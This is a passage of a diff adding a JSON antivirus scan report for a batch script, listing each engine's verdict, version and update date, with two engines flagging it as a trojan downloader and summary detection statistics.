+        "Yandex": {
+          "method": "blacklist",
+          "engine_name": "Yandex",
+          "engine_version": "5.5.2.24",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "huorong": {
+          "method": "blacklist",
+          "engine_name": "huorong",
+          "engine_version": "c1c2a8f:c1c2a8f:0b37565:0b37565",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "TrojanDownloader/MyKings.d"
+        },
+        "MaxSecure": {
+          "method": "blacklist",
+          "engine_name": "MaxSecure",
+          "engine_version": "4.0.3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Fortinet": {
+          "method": "blacklist",
+          "engine_name": "Fortinet",
+          "engine_version": "7.0.48.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Panda": {
+          "method": "blacklist",
+          "engine_name": "Panda",
+          "engine_version": "4.6.4.2",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "alibabacloud": {
+          "method": "blacklist",
+          "engine_name": "alibabacloud",
+          "engine_version": "2.2.0",
+          "engine_update": "20250321",
+          "category": "malicious",
+          "result": "Trojan[downloader]:Win/PWSH.Daxpiqykrp"
+        },
+        "Varist": {
+          "method": "blacklist",
+          "engine_name": "Varist",
+          "engine_version": "6.6.1.3",
+          "engine_update": "20261109",
+          "category": "timeout",
+          "result": null
+        },
+        "Zillya": {
+          "method": "blacklist",
+          "engine_name": "Zillya",
+          "engine_version": "2.0.0.5726",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "TrendMicro": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "Avast": {
+          "method": "blacklist",
+          "engine_name": "Avast",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "Kaspersky": {
+          "method": "blacklist",
+          "engine_name": "Kaspersky",
+          "engine_version": "22.0.1.28",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "Skyhigh": {
+          "method": "blacklist",
+          "engine_name": "Skyhigh",
+          "engine_version": null,
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "TrellixENS": {
+          "method": "blacklist",
+          "engine_name": "TrellixENS",
+          "engine_version": "6.0.6.653",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "AVG": {
+          "method": "blacklist",
+          "engine_name": "AVG",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "Avast-Mobile": {
+          "method": "blacklist",
+          "engine_name": "Avast-Mobile",
+          "engine_version": "261109-00",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "SymantecMobileInsight": {
+          "method": "blacklist",
+          "engine_name": "SymantecMobileInsight",
+          "engine_version": "2.0",
+          "engine_update": "20260123",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "BitDefenderFalx": {
+          "method": "blacklist",
+          "engine_name": "BitDefenderFalx",
+          "engine_version": "2.0.936",
+          "engine_update": "20261022",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Elastic": {
+          "method": "blacklist",
+          "engine_name": "Elastic",
+          "engine_version": "4.0.297",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "tehtris": {
+          "method": "blacklist",
+          "engine_name": "tehtris",
+          "engine_version": "v0.1.4",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "APEX": {
+          "method": "blacklist",
+          "engine_name": "APEX",
+          "engine_version": "6.839",
+          "engine_update": "20261107",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trapmine": {
+          "method": "blacklist",
+          "engine_name": "Trapmine",
+          "engine_version": "4.0.17.0",
+          "engine_update": "20261026",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Paloalto": {
+          "method": "blacklist",
+          "engine_name": "Paloalto",
+          "engine_version": "0.9.0.1003",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Alibaba": {
+          "method": "blacklist",
+          "engine_name": "Alibaba",
+          "engine_version": "0.3.0.5",
+          "engine_update": "20190527",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Webroot": {
+          "method": "blacklist",
+          "engine_name": "Webroot",
+          "engine_version": "1.9.0.8",
+          "engine_update": "20250227",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Cylance": {
+          "method": "blacklist",
+          "engine_name": "Cylance",
+          "engine_version": "3.0.0.0",
+          "engine_update": "20261103",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "SentinelOne": {
+          "method": "blacklist",
+          "engine_name": "SentinelOne",
+          "engine_version": "7.8.0.2",
+          "engine_update": "20260924",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trustlook": {
+          "method": "blacklist",
+          "engine_name": "Trustlook",
+          "engine_version": "1.0",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "DeepInstinct": {
+          "method": "blacklist",
+          "engine_name": "DeepInstinct",
+          "engine_version": "5.0.0.8",
+          "engine_update": "20260614",
+          "category": "type-unsupported",
+          "result": null
+        }
+      },
+      "first_submission_date": 1794229788,
+      "sigma_analysis_summary": {
+        "Sigma Integrated Rule Set (GitHub)": {
+          "critical": 0,
+          "high": 1,
+          "medium": 5,
+          "low": 1
+        }
+      },
+      "type_tags": [
+        "script",
+        "bat"
+      ],
+      "last_analysis_stats": {
+        "malicious": 20,
+        "suspicious": 0,
+        "undetected": 33,
+        "harmless": 0,
+        "timeout": 1,
+        "confirmed-timeout": 0,
+        "failure": 7,
+        "type-unsupported": 14
+      }
+    }
+  }
+}
